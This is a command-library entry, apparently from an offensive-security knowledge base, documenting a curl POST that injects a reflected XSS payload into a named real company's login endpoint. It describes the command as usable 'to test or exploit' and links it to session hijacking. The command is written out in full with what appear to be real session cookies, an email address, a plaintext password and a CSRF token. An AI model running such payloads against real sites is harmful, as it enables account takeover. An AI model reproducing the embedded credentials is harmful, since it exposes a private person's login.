---
data: >-
  curl -X POST
  "https://panel.stopthehacker.com/login/process?e22ec\"><script>alert(1)</script>edff4caab65=1"
  -H "Host: panel.stopthehacker.com" -H "User-Agent: Mozilla/5.0 (Windows NT
  6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Referer: https://panel.stopthehacker.com/login" -H "Cookie:
  utma=154329338.42246299.1398423628.1398423628.1398425435.2; utmc=154329338;
  utmz=154329338.1398423628.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);
  sth_panel=G%2CbOpqGLFXVqHBPLdVJcD2;
  utma=66990511.534853050.1398423714.1398423714.1398427276.2; utmc=66990511;
  utmz=66990511.1398427276.2.2.utmcsr=stopthehacker.com|utmccn=(referral)|utmcmd=referral|utmcct=/;
  utmb=154329338.1.9.1398427271588; utmb=66990511.2.10.1398427276" -H
  "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded"
  -d
  "email=robincool031%40gmail.com&password=259733%40ramani&login=&csrf=33ed08e46e14d0622ff36ad779654418"
tags:
  - xss
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:53.149Z'
id: dc4f0554-6f6a-46b3-b6a6-7bbfe6ff3413
verified: false
validated: true
submitted: true
---
# send-malicious-login-post

## Command

```bash
curl -X POST "https://panel.stopthehacker.com/login/process?e22ec\"><script>alert(1)</script>edff4caab65=1" -H "Host: panel.stopthehacker.com" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Referer: https://panel.stopthehacker.com/login" -H "Cookie: utma=154329338.42246299.1398423628.1398423628.1398425435.2; utmc=154329338; utmz=154329338.1398423628.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); sth_panel=G%2CbOpqGLFXVqHBPLdVJcD2; utma=66990511.534853050.1398423714.1398423714.1398427276.2; utmc=66990511; utmz=66990511.1398427276.2.2.utmcsr=stopthehacker.com|utmccn=(referral)|utmcmd=referral|utmcct=/; utmb=154329338.1.9.1398427271588; utmb=66990511.2.10.1398427276" -H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -d "email=robincool031%40gmail.com&password=259733%40ramani&login=&csrf=33ed08e46e14d0622ff36ad779654418"
```

## Description

This curl command sends a POST request to the StopTheHacker login endpoint with a reflected XSS payload in the query string, demonstrating JavaScript injection for session hijacking. Use it to test or exploit unsanitized input reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| URL with payload | Target endpoint with XSS in query (e.g., ?e22ec"><script>alert(1)</script>edff4caab65=1) | Yes |
| `-H "Host: ..."` | Sets the Host header | Yes |
| `-H "User-Agent: ..."` | Mimics browser user agent | Yes |
| `-H "Accept: ..."` | Sets accepted content types | Yes |
| `-H "Cookie: ..."` | Includes session cookies if needed | No |
| `-d "..."` | Form data with URL-encoded email, password, and CSRF | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://example.com/login?e22ec\"><script>alert(1)</script>edff4caab65=1" -H "Content-Type: application/x-www-form-urlencoded" -d "email=test%40example.com&password=test"
```

### Advanced Usage

```bash
curl -X POST "https://panel.stopthehacker.com/login/process?payload" -H "All headers as above" -d "Full form data with real CSRF"
```

## Expected Output

HTTP response with status 200 or 302, HTML body reflecting the payload (e.g., containing <script>alert(1)</script>), which executes as an alert in the browser when loaded.

## Related

- [[procedures/Exploit-Reflected-XSS-with-Malicious-Payload]]
- [[procedures/Identify-Reflected-XSS-in-Login-Endpoint]]
